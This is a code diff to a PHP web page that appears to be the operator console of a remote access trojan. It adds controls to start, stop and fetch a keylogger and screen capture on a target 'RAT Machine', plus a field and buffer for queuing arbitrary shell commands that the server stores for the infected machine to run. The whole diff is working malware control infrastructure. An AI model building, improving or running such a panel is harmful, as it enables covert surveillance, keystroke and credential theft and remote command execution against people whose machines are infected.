@@ -10,7 +10,8 @@
 
 <section class="section">
     <div class="container">
-        <div class="card has-background-dark">
+        <!-- Card Header -->
+        <div class="card has-background-primary">
             <div class="columns is-vcentered is-centered">
                 <div class="column is-narrow">
                     <figure class="image" style="width: 10rem;">
@@ -22,58 +23,86 @@
                 </div>
             </div>
         </div>
+
         <div class="box">
             <h2 class="subtitle">Quick Commands</h2>
             <form method="post" action="index.php">
                 <input type="hidden" name="machine" value="<?= htmlspecialchars($machine) ?>">
-                
                 <div class="field is-grouped is-grouped-multiline">
                     <div class="control">
-                        <button class="button is-info" type="submit" name="command" value="startkeylog">Start Keylogger</button>
+                        <button class="button is-info is-outlined" type="submit" name="command" value="startkeylog">Start Keylogger</button>
                     </div>
                     <div class="control">
-                        <button class="button is-light" type="submit" name="command" value="stopkeylog">Keylogger Retrieve</button>
+                        <button class="button is-warning is-outlined" type="submit" name="command" value="stopkeylog">Stop Keylogger</button>
                     </div>
                     <div class="control">
-                        <button class="button is-info type="submit" name="command" value="startdc">Screen Start</button>
+                        <button class="button is-success is-outlined" type="submit" name="button_keylog">Get Keylog</button>
                     </div>
                     <div class="control">
-                        <button class="button is-light" type="submit" name="command" value="stopdc">Screen Retrieve</button>
+                        <button class="button is-info is-outlined" type="submit" name="command" value="startdc">Start ScreenCap</button>
+                    </div>
+                    <div class="control">
+                        <button class="button is-warning is-outlined" type="submit" name="command" value="stopdc">Stop ScreenCap</button>
+                    </div>
+                    <div class="control">
+                        <button class="button is-success is-outlined" type="submit" name="button_screen">Get ScreenCap</button>
                     </div>
                 </div>
             </form>
         </div>
+
         <div class="box">
-            <form method="post" action="index.php" id="cmd_form">
-                <div class="field">
-                    <label class="label">RAT Machine:</label>
-                    <div class="control">
-                        <input class="input is-info" type="text" name="machine" readonly value="<?= htmlspecialchars($machine) ?>">
+            <form method="post" action="index.php" id="cmd_form">                
+                <h2 class="subtitle">Command Control Panel</h2>
+                <div class="columns is-variable is-8">
+                    <div class="column is-half">
+                        <div class="field">
+                            <label class="label has-text-info">RAT Machine:</label>
+                            <div class="control has-icons-left">
+                                <input class="input is-info" type="text" name="machine" readonly value="<?= htmlspecialchars($machine) ?>">
+                                <span class="icon is-small is-left">
+                                    <i class="fas fa-desktop"></i>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="field">
+                            <label class="label has-text-info">Run Command</label>
+                            <div class="control has-icons-left">
+                                <input class="input is-info" type="text" name="command" placeholder="start chrome www.google.com" value="<?= htmlspecialchars(get_machine_data($machine, 'command') ?? '') ?>">
+                                <span class="icon is-small is-left">
+                                    <i class="fas fa-terminal"></i>
+                                </span>
+                            </div>
+                        </div>
                     </div>
-                </div>
-                
-                <div class="field">
-                    <label class="label">Run command</label>
-                    <div class="control">
-                        <input class="input is-info" type="text" name="command" placeholder="start chrome www.google.com" size="35">
+                    <div class="column">
+                        <div class="field">
+                            <label class="label has-text-info">Command Buffer</label>
+                            <div class="control">
+                                <textarea class="textarea is-info" name="command_buffer" placeholder="Add a list of commands divided by &&" rows="6"><?= htmlspecialchars(get_machine_data($machine, 'command_buffer') ?? '') ?></textarea>
+                            </div>
+                        </div>
                     </div>
                 </div>
 
-                <div class="field is-grouped">
+                <div class="field is-grouped is-grouped-centered mt-4">
                     <div class="control">
-                        <button class="button is-primary" type="submit" name="button_execute">Execute</button>
+                        <button class="button is-primary is-outlined" type="submit" name="button_execute">
+                            <span class="icon"><i class="fas fa-play"></i></span>
+                            <span>Execute</span>
+                        </button>
                     </div>
                     <div class="control">
-                        <button class="button is-success" type="submit" name="button_result">Get Output</button>
+                        <button class="button is-success is-outlined" type="submit" name="button_result">
+                            <span class="icon"><i class="fas fa-download"></i></span>
+                            <span>Get Output</span>
+                        </button>
                     </div>
                     <div class="control">
-                        <button class="button is-success" type="submit" name="button_keylog">Get Keylog</button>
-                    </div>
-                    <div class="control">
-                        <button class="button is-success" type="submit" name="button_screen">Screen</button>
-                    </div>
-                    <div class="control">
-                        <a class="button" href="/">Home</a>
+                        <a class="button is-link is-outlined" href="/">
+                            <span class="icon"><i class="fas fa-home"></i></span>
+                            <span>Home</span>
+                        </a>
                     </div>
                 </div>
             </form> 
@@ -93,6 +122,24 @@
             return $output;
         }
 
+        if (isset($_POST['button_execute'])) {
+            $command = $_POST['command'] ?? '';
+            $command_buffer = $_POST['command_buffer'] ?? '';
+
+            if (!empty($command) || !empty($command_buffer)) {
+                $conn = connect_to_db();
+                $query = "UPDATE machines SET command = ?, command_buffer = ? WHERE name = ?";
+                $stmt = $conn->prepare($query);
+                $stmt->bind_param('sss', $command, $command_buffer, $machine);
+                $stmt->execute();
+                $stmt->close();
+                $conn->close();
+
+                echo "Commands saved successfully for " . htmlspecialchars($machine);
+            } else {
+                echo "Commands cannot be empty";
+            }
+        }
         if (isset($_POST['button_result'])) {
             $output = get_machine_data($machine, 'output');
             echo '
@@ -143,22 +190,6 @@
                     </div>
                 </div>
             </div>';
-        }
-
-        if (isset($_POST['button_execute']) || in_array($_POST['command'] ?? '', ['startkeylog', 'stopkeylog', 'startdc', 'stopdc'])) {
-            $command = $_POST['command'] ?? '';
-            if (!empty($command)) {
-                echo 'Received: ' . htmlspecialchars($command) . '<br>' . 'For ' . htmlspecialchars($machine);
-                $conn = connect_to_db();
-                $query = "UPDATE machines SET command = ? WHERE name = ?";
-                $stmt = $conn->prepare($query);
-                $stmt->bind_param('ss', $command, $machine);
-                $stmt->execute();
-                $stmt->close();
-                $conn->close();
-            } else {
-                echo "Commands cannot be empty";
-            }
         }
         ?>
     </div>
